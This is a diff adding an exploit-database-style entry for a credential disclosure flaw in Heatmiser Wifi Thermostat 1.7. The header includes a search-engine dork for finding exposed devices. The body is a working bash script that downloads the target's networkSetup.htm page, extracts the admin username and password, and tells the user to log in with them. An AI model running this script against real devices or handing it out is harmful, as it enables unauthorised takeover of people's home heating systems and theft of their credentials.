@@ -1,0 +1,27 @@
+# Exploit Title: Heatmiser Wifi Thermostat 1.7 - Credential Disclosure 
+# Dork: intitle:"Heatmiser Wifi Thermostat"
+# Date: 2018-08-17
+# Exploit Author: d0wnp0ur
+# Original Discoverer: Andrew Tierney
+# Vendor Lnk: https://www.heatmiser.com/en/ 
+# Product Link: https://www.heatmiser.com/en/wireless-thermostats/
+# Tested on: Heatmiser Version 1.7
+# CVE: N/A
+
+#!/bin/bash
+
+echo Heatmiser Smart Thermometer Hack
+echo By d0wnp0ur
+echo Usage: $0 \<ip\[:port\]\> \(Default is 80. If it doesn\'t work, try port 8081\)
+echo This tool gets the username and password of a vulnerable Heatmiser thermostat
+echo Deleting old files
+rm networkSetup.htm*
+echo Copying disclosing page
+wget http://$1/networkSetup.htm
+echo Getting Username and Password
+echo Username:
+cat networkSetup.htm | grep "User" | grep "Name:" | awk -F 'value=' '{print $2}' | cut -d '"' -f 2
+echo Password:
+cat networkSetup.htm | grep "User" | grep "Password:" |grep -v -i "confirm" |  awk -F 'value=' '{print $2}' | cut -d '"' -f 2
+echo Success! Log in to the web interface with the above credentials.
+echo http://$1
